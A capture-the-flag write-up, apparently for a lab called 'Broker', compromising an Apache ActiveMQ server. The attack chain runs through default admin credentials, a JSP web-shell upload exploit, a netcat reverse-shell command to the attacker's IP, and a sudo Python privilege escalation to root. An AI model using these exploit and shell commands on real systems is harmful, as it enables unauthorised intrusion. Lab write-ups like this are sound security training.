> Broker

**export IP=10.10.108.148**

# Nmap

sudo nmap -sC -sV -T4 -Pn -p- -vvv -O -oN nmap/initial $IP

```
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
1883/tcp  open  mqtt?      syn-ack ttl 63
|_mqtt-subscribe: The script encountered an error: ssl failed
8161/tcp  open  http       syn-ack ttl 63 Jetty 7.6.9.v20130131
|_http-favicon: Unknown favicon MD5: 05664FB0C7AFCD6436179437E31F3AA6
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: Jetty(7.6.9.v20130131)
|_http-title: Apache ActiveMQ
45493/tcp open  tcpwrapped syn-ack ttl 63
```

Looking at port 8161, we can see Apache ActiveMQ. And accessing `http://10.10.108.148:8161/admin/` we need to be authorized. Searching google for default passwords we can find `admin`:`admin`. And we are in!!

And accessing `http://10.10.108.148:8161/admin/topics.jsp` we can see a topic `secret_chat`. We have to install a mqtt client and access it. Changing the git code we can access the topic `secret_chat`.

python3 mqqt_client.py

```
secret_chat b"Max: Yeah, honestly that's the one game that got me into hacking, since I wanted to know how hacking is 'for real', you know? ;)"
secret_chat b'Paul: Sounds awesome, I will totally try it out then ^^'
secret_chat b'Max: Nice! Gotta go now, the boss will kill us if he sees us chatting here at work. This broker is not meant to be used like that lol. See ya!'
secret_chat b"Paul: Hey, have you played the videogame 'Hacknet' yet?"
```

We can find an exploit for `ActiveMQ` in Metasploit. But metasploit exploit didn't work. Looking in github we found an exploit. 

## Exploit

python3 ActiveMQ_putshell.py -u http://$IP:8161

```
ActiveMQ_put_path：/opt/apache-activemq-5.9.0/webapps/
ActiveMQ_put__txt：http://10.10.108.148:8161/fileserver/guo.txt
ActiveMQ_putshell：http://10.10.108.148:8161/admin/guo.jsp
```

Accessing `http://10.10.108.148:8161/admin/guo.jsp?pwd=gshell&shell=whoami` we have a response.

Let's get a reverse shell, `http://10.10.108.148:8161/admin/guo.jsp?pwd=gshell&shell=nc 10.8.107.21 1234 -e /bin/sh`. And we have a shell!!

# flag.txt

```
THM{you_got_a_m3ss4ge}
```

# Privilege Escalation

sudo -l

```
User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

We can add 2 line to get root access.

```
import os
os.system("/bin/bash")
```

And executing `sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py` we are in as root!!

# root.txt

```
THM{br34k_br0k3_br0k3r}
```